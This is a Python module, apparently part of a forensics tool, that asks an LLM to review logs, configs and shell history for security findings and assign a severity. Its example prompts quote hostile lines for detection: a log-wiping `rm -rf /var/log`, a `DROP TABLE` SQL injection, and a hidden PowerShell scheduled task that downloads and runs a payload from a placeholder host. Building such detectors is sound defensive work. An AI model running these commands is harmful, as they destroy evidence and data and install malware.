# Copyright 2024-2025 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import logging
from typing import Any, Dict, Tuple

from openrelik_ai_common.providers import manager
from openrelik_worker_common.reporting import Priority, Report

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

CONTEXT_PROMPT = """
I'm a security engineer investigating a potential cybersecurity incident and need your help analyzing
a forensics artifact. I'll provide the artifact separately. Focus on identifying concerning security
findings. A security finding can be any of:

* **Vulnerable Configurations:** Settings that create weaknesses attackers could exploit (e.g., Docker daemon allowing anonymous connections)
* **Suspicious Activity:**  Entries that seem unusual, malformed, or could indicate malicious behavior, for example:
    * **Persistence:** Attempts to establish a foothold on the system (e.g., modifying startup scripts).
    * **Malware Installation:**  Downloading and executing suspicious executables
    * **Command and Control Communication:**  Reaching out to external servers known for malicious activity.

** IMPORTANT** Your response should only include details about findings. If no findings reply
with no security findings found. Response should be brief, short and related to a finding.
"""
REQUEST_PROMPT = """
**Artifact Name:** {artifact_name}

Please analyze this artifact based on the instructions from the previous prompt. For each finding, briefly provide:

* **What:** A concise description.
* **Why:** A short explanation of the potential security risk.

**Examples of findings:**
* **Bash History:** `rm -rf /var/log` (Attempts to delete critical log files)
* **SSH Logs:**
    * Successful login for ‘root’ from infrequent IP address 203.0.113.1
    * Successful login for 'webadmin' after 5 failed attempts from IP 123.45.67.89
* **Web Server Logs:**  GET requests with SQL injection patterns like `/products?id=1; DROP TABLE users`
* **Sudoers File:**  `web_team ALL=(ALL:ALL) NOPASSWD: ALL` (Excessive privileges)
* **Apache Config:** `Options +FollowSymLinks` (Potential directory traversal risk)
* **Unexpected Scheduled Tasks:** `schtasks /create /tn "WindowsUpdates" /tr "powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')" /sc daily /st 02:00` (downloading malware)
* **Firewall Config:**  `ACCEPT INPUT from 0.0.0.0/0 to any port 22` (SSH open to the world)
* **Password file:**  `admin:admin123` (Simple, default password)
* **SNMP Config:** Community string 'public' (Easily guessable)
* **Web App Config:**  Debug mode enabled in production
"""
CONTENT_PROMPT = """
"**Artifact Content (Part {i} of {chunks_len}):** \n```\n{chunk}\n```"
"""
PRIORITY_PROMPT = """
Please set the severity of the security findings, your response must be a single word from the following list: [INFO, LOW, MEDIUM, HIGH, CRITICAL]
"CRITICAL" should be for confirmed maliciousness or vulerabilities with public exploits.
"INFO" should be the default if no maliciousness or vulerabilities found

**Examples answer:**
CRITICAL
"""
SUMMARY_PROMPT = """
Please provide a summarry statement for all security findings in the analysis below, keep summary concise but complete and don't describe the summary.
The name of the artifact being analyzed is {artifact_name}.

**Analysis:**
```
{file_analysis_response}
```
"""


def analyze_text_content(input_file: Dict[str, Any], task_config: Dict[str, Any]) -> Report:
    """Analyze logs, configs and history text-files.

    Args:
        input_file: The input file dictionary.
        task_config: The task configuration dictionary.

    Returns:
        report (Report): The analysis report.
    """
    logger.info(
        "LLM Analyzer 'analyze_text_content', filename: %s, path: %s",
        input_file.get("filename"),
        input_file.get("path"),
    )
    # Read the input file to be analyzed.
    file_content = ""
    try:
        with open(input_file.get("path"), "r", encoding="utf-8") as fh:
            file_content = fh.read()
    except UnicodeDecodeError:
        logger.error(f"UnicodeDecodeError: Artifact {input_file.get('path')} not UTF-8 encoded")
        return None

    priority, summary, details = llm_analyze_artifact(
        file_content,
        f"{input_file.get('filename')}-{input_file.get('data_type')}",
        task_config,
    )

    report = Report()
    report.priority = priority
    report.summary = summary
    details_section = report.add_section()
    details_section.add_paragraph(details)
    return report


def llm_analyze_artifact(
    artifact_content: str, artifact_name: str, task_config: Dict[str, Any]
) -> Tuple[Priority, str, str]:
    """Analyses forensics artifact using GenAI.

    Args:
        artifact_content (str): artifact text content.
        artifact_name (str): artifact name.
        task_config: The task configuration dictionary.

    Returns:
        The priority of findings and the report summary
    """
    if task_config and task_config.get("llm_provider"):
        llm_provider = task_config.get("llm_provider")
    else:
        llm_provider = "googleai"
    llm_model = None
    if task_config and task_config.get("llm_model"):
        llm_model = task_config.get("llm_model")
    max_input_tokens = None
    if task_config and task_config.get("model_max_input_tokens"):
        max_input_tokens = task_config.get("model_max_input_tokens")
    logger.info(
        "LLM Analyzer 'llm_analyze_artifact', provider: %s, model: %s",
        llm_provider,
        llm_model,
    )
    provider = manager.LLMManager().get_provider(llm_provider)
    llm = provider(
        model_name=llm_model,
        system_instructions=CONTEXT_PROMPT,
        max_input_tokens=max_input_tokens,
    )
    details = llm.generate_file_analysis(
        prompt=REQUEST_PROMPT.format(artifact_name=artifact_name),
        file_content=artifact_content,
    )
    summary = llm.chat(
        SUMMARY_PROMPT.format(artifact_name=artifact_name, file_analysis_response=details)
    )
    priority = llm.chat(PRIORITY_PROMPT)
    if "CRITICAL" in priority.upper():
        priority = Priority.CRITICAL
    elif "HIGH" in priority.upper():
        priority = Priority.HIGH
    elif "MEDIUM" in priority.upper():
        priority = Priority.MEDIUM
    elif "LOW" in priority.upper():
        priority = Priority.LOW
    else:
        # Default to INFO to avoid noise
        priority = Priority.INFO
    return priority, summary, details
